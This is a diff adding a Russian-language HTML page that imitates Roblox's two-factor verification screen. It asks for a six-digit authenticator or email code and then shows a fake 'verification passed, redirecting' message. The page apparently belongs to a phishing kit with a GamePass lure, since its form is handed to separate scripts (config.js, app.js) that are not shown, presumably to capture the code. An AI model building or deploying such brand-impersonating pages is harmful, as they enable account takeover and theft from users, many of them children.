@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<title>Roblox — Двухфакторная проверка</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body class="rbx-bg">
+
+<div class="rbx-header">
+    <div class="rbx-logo">
+        <svg viewBox="0 0 24 24" width="28" height="28"><path fill="#fff" d="M5.5 2l14 3.5-3.5 14-14-3.5z"/></svg>
+        <span>Roblox</span>
+    </div>
+</div>
+
+<div class="rbx-wrap">
+    <div class="rbx-card">
+        <h1>Двухфакторная проверка</h1>
+        <p class="rbx-sub">Введите код из приложения-аутентификатора или из email.</p>
+
+        <form id="regform" data-page="GamePass — 2FA">
+            <label>
+                Код подтверждения
+                <input type="text" name="code" placeholder="6-значный код" maxlength="6" inputmode="numeric" required>
+            </label>
+
+            <button type="submit" class="rbx-btn">Подтвердить</button>
+        </form>
+
+        <div id="success" style="display:none" class="rbx-success">
+            <p>Проверка пройдена. Перенаправление...</p>
+        </div>
+    </div>
+</div>
+
+<script src="config.js"></script>
+<script src="app.js"></script>
+</body>
+</html>
